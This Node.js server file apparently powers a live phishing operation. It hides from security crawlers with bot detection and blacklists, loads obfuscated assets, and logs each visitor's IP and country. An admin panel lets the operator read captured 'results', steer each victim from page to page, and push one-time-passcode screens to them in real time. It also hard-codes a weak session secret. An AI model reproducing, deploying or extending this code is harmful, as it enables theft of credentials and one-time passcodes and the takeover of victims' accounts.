import express from "express";
import http from "http";
import { Server } from "socket.io";
import sqlite3 from "sqlite3";
import { open } from "sqlite";
import { initDB } from "./db.js";
import path from "path";
import { fileURLToPath } from "url";
import createRoutes from "./routes/routes.js";
import { blacklistMiddleware, createBotRouter } from './middleware/frontblock.js';
import { getClientIP, getNextPage, pageFlow, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets } from "./utils.js";
import capRouter, { requireCap } from "./altcheck.js";
import geoip from "geoip-lite";
import session from "express-session"; 
import botDetection from './botDetection.cjs';
import cookieParser from 'cookie-parser';
import bcrypt from "bcrypt";
const { isBotIP, isBotRef, isCrawler, detectBotMiddleware } = botDetection;


const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// ---- Prepare assets (non-critical)
try {
  await prepareObfuscatedAssets();
} catch (err) {
  console.warn("⚠️ prepareObfuscatedAssets failed:", err);
}

// ---- Core middlewares
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(cookieParser());
// ⚠️ Important: blacklist comes before static if you want to block bots early
app.use(blacklistMiddleware);
app.use(detectBotMiddleware);
app.use(express.static(path.join(__dirname, "public")));

// ✅ Session middleware must come before any routes that need it
app.use(
  session({
    secret: "supersecretkey",
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false },
  })
);

app.use('/.well-known/acme-challenge', express.static(path.join(__dirname, '.well-known', 'acme-challenge')));
app.use("/", capRouter);


  const db = await initDB();
  // ✅ Now mount app routes AFTER session is active
  app.use(blockedRedirect(db)); 
  app.use("/", createRoutes(db, io));
  
  // pass db and io to bot router factory
  app.use('/', createBotRouter(db, io));

  console.log("✅ Routes and botRouter loaded.");

  
// ----------------------
// Socket.IO logic
// ----------------------
io.on("connection", async (socket) => {
	
	async function getUserDisplayMode() {
  try {
    const row = await db.get(`
      SELECT userDisp 
      FROM admin_settings 
      LIMIT 1
    `);

    // Normalize value and fallback to "active"
    const mode = (row?.userDisp || "active")
      .toString()
      .trim()
      .toLowerCase();

    console.log("📌 Display mode:", mode);

    return mode;
  } catch (err) {
    console.error("⚠️ Error reading display mode:", err);
    return "active"; // safe fallback
  }
}
	
// helper to get current users depending on DB setting
async function fetchUsersByDisplayMode() {
  // get normalized mode from your helper
  const mode = await getUserDisplayMode();

  console.log("📌 fetchUsersByDisplayMode -> mode =", mode);

  if (mode === "all") {
    return await db.all(`
      SELECT * FROM users
      ORDER BY last_seen DESC
    `);
  }

  // default: active users
  return await db.all(`
    SELECT * FROM users
    WHERE last_seen >= datetime('now', '-3 minutes')
    ORDER BY last_seen DESC
  `);
}

// user:update
socket.on("user:update", async (data) => {
  try {
    const { userId, newStatus, page } = data;
    socket.userId = userId;

    const ip = getClientIP(socket);
    const geo = geoip.lookup(ip);
    const countryCode = geo ? geo.country : null;

    // check existing user status (blocked) before updating DB
    const existingUser = await db.get("SELECT status FROM users WHERE id = ?", [userId]);
    if (existingUser && existingUser.status === "blocked") {
      console.log(`⛔ User ${userId} is blocked — skipping DB update.`);

      // still send admin UI the list based on current view mode (fresh read)
      const users = await fetchUsersByDisplayMode();
      io.emit("admin:update", users);
      return;
    }

    // Insert or update the user row
    await db.run(
      `
      INSERT INTO users (id, status, last_seen, page, ip, country)
      VALUES (?, ?, datetime('now'), ?, ?, ?)
      ON CONFLICT(id) DO UPDATE SET
        status = excluded.status,
        last_seen = excluded.last_seen,
        page = excluded.page,
        ip = excluded.ip,
        country = excluded.country
      `,
      [userId, newStatus, page || "unknown", ip, countryCode]
    );

    // fetch the users list according to latest setting
    const users = await fetchUsersByDisplayMode();

    // optional: tweak the single user object before sending
    const updatedUsers = users.map(u => u.id === userId ? { ...u, screen: null } : u);

    io.emit("admin:update", updatedUsers);
  } catch (err) {
    console.error("⚠️ Error in user:update handler:", err);
  }
});

  // admin:readyResults (send results + identifier)
  socket.on("admin:readyResults", async () => {
    try {
      const results = await db.all(`
        SELECT 
          r.user_id,
          u.identifier,
          r.message,
          r.user_info,
          r.timestamp
        FROM results r
        LEFT JOIN users u ON r.user_id = u.id
        ORDER BY r.timestamp DESC
      `);

      socket.emit("admin:resultsUpdate", results);
    } catch (err) {
      console.error("⚠️ Error loading results:", err);
    }
  });

  // admin commands
  socket.on("admin:command", async (data) => {
    try {
      const { userId, command } = data;
      console.log(`🧭 Admin sent command '${command}' to user ${userId}`);

      for (let [id, s] of io.of("/").sockets) {
        if (s.userId === userId) {
          let link = null;
          let code = null;
          let phonescreen = null;

          if (command === "nextpage") {
            const user = await db.get("SELECT page FROM users WHERE id = ?", [userId]);
            link = await getNextPage(user?.page);
            console.log("link", link);
          } else if (command === "redirect") {
            link = resolveFrontendRoute("final");
          } else if (command === "phone-otp") {
            code = data.otp;
            phonescreen = resolveFrontendRoute("otp");
          }

          if (link) {
            s.emit("user:command", { command: "redirect", link });
            console.log(`➡️ Redirecting user ${userId} to ${link}`);
          } else if (code) {		
            s.emit("user:command", { command: "phone-otp", code, phonescreen });
            console.log(`➡️ Sending OTP to user ${userId}`);
          } else {
            s.emit("user:command", { command });
            console.log(`📨 Command '${command}' delivered to user ${userId}`);
          }

          // update admin UI (only to the admin who issued the command)
          const users = await db.all(
            `SELECT * FROM users WHERE last_seen >= datetime('now', '-2 minutes')`
          );
          socket.emit("admin:update", users);

          break;
        }
      }
    } catch (err) {
      console.error("⚠️ Error in admin:command:", err);
    }
  });
  
  

  // admin ready (list active users)
  socket.on("admin:ready", async ({ mode } = {}) => {
  try {
    if (!mode) {
      mode = await getUserDisplayMode();
    }

    const users = await fetchUsersByDisplayMode(); 

    socket.emit("admin:update", users);
  } catch (err) {
    console.error(err);
  }
});

  // disconnect — set user offline
  socket.on("disconnect", async () => {  
  try {  
    if (!socket.userId) return;  

    // Fetch user record
    const user = await db.get(
      "SELECT status FROM users WHERE id = ?",
      [socket.userId]
    );  

    const mode = await getUserDisplayMode();  
    const users = await fetchUsersByDisplayMode();  // <-- FIXED

    console.log("disconnect mode:", mode, "type:", typeof mode);

    // Blocked users: no status update
    if (user && user.status === "blocked") {
      console.log(`⛔ User ${socket.userId} is blocked — skipping status update.`);
      io.emit("admin:update", users);
      return;
    }

    // Normal users: set offline
    await db.run(
      "UPDATE users SET last_seen = datetime('now'), status = 'offline' WHERE id = ?",
      [socket.userId]
    );

    io.emit("admin:update", users);

    console.log("🔴 Disconnected:", socket.id, socket.userId);

  } catch (err) {  
    console.error("⚠️ disconnect handler error:", err);  
  }  
});
});

// ----------------------
// start server
// ----------------------
const PORT = process.env.PORT || 3300;
server.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));